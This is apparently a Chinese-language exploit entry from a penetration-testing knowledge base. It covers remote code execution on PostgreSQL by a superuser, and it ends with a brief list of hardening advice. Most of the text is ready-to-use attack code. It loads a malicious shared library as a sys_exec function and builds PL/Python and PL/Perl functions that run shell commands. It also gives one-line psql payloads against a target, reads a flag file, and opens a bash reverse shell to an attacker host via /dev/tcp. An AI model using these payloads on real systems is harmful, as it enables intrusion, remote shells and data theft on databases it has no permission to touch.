---
id: POSTGRES-UDF-RCE
title: "PostgreSQL - UDF/PL扩展远程代码执行"
product: postgres
vendor: PostgreSQL
version_affected: "all versions (misconfiguration)"
severity: CRITICAL
tags: [rce, udf, plpython, plperl, 需要认证]
fingerprint: ["PostgreSQL"]
---

## 漏洞描述

PostgreSQL 支持通过 C 语言 UDF（User-Defined Function）、PL/Python、PL/Perl 等扩展语言执行操作系统命令。攻击者在获取 superuser 权限后，可以加载恶意 C 共享库创建自定义函数，或利用 PL/Python、PL/Perl 的系统调用能力直接执行命令。当 COPY FROM PROGRAM 不可用或被限制时，这些是有效的替代方案。

## 影响版本

- 所有版本（需要 superuser 权限）

## 前置条件

- PostgreSQL superuser 权限（如 postgres 用户）
- UDF 方式需要能写入 .so 文件到服务器或使用 lo_ 函数
- PL/Python 方式需要安装 plpythonu 或 plpython3u 扩展
- PL/Perl 方式需要安装 plperlu 扩展

## 利用步骤

### 方法一：UDF C 语言扩展

```sql
-- 写入 UDF .so 文件
-- 先将 .so 文件内容 base64 编码
CREATE OR REPLACE FUNCTION write_file(TEXT, TEXT) RETURNS VOID AS $$
  import os
  open(args[0], 'wb').write(args[1].decode('hex'))
$$ LANGUAGE plpythonu;

-- 或直接用 lo_ 函数上传
SELECT lo_import('/tmp/evil.so');

-- 创建函数
CREATE OR REPLACE FUNCTION sys_exec(TEXT) RETURNS INT AS
  '/tmp/evil.so', 'sys_exec' LANGUAGE C STRICT;

-- 执行命令
SELECT sys_exec('id > /tmp/out.txt');
```

### 方法二：PL/Python 执行

```sql
-- 如果安装了 plpythonu 或 plpython3u
CREATE EXTENSION IF NOT EXISTS plpythonu;

CREATE OR REPLACE FUNCTION cmd(cmd TEXT) RETURNS TEXT AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;

SELECT cmd('id');
SELECT cmd('cat /root/flag.txt');
SELECT cmd('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### 方法三：PL/Perl 执行

```sql
CREATE EXTENSION IF NOT EXISTS plperlu;

CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
  return `$_[0]`;
$$ LANGUAGE plperlu;

SELECT cmd('id');
```

## Payload

```bash
# 检查可用扩展
psql -h TARGET -U postgres -c "SELECT * FROM pg_available_extensions WHERE name LIKE 'pl%';"

# 快速 PL/Python RCE
psql -h TARGET -U postgres -c "CREATE EXTENSION IF NOT EXISTS plpythonu; CREATE OR REPLACE FUNCTION cmd(c TEXT) RETURNS TEXT AS \$\$ import subprocess; return subprocess.check_output(c, shell=True).decode() \$\$ LANGUAGE plpythonu; SELECT cmd('id');"
```

## 修复建议

1. 限制 superuser 权限的分配
2. 不安装不必要的过程语言扩展（plpythonu、plperlu）
3. 使用 pg_hba.conf 限制远程连接来源
4. 设置强密码，禁止信任模式（trust）认证
5. 定期审计已安装的扩展和自定义函数
